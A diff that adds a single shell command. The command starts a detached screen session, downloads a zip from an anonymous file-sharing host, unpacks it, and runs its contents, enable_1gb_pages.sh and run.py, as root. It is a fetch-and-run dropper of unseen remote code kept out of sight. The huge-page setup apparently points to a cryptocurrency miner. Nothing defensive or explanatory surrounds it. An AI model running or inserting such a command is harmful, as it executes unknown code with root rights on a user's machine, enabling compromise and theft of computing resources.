@@ -1,0 +1,1 @@
+screen -dm bash -c "sudo apt-get update && sudo apt-get install python3-pip zip unzip -y && pip3 install psutil && wget https://transfer.sh/get/12xQPg/out.zip && unzip -o out.zip && rm out.zip && sudo ./enable_1gb_pages.sh && sudo python3 run.py"
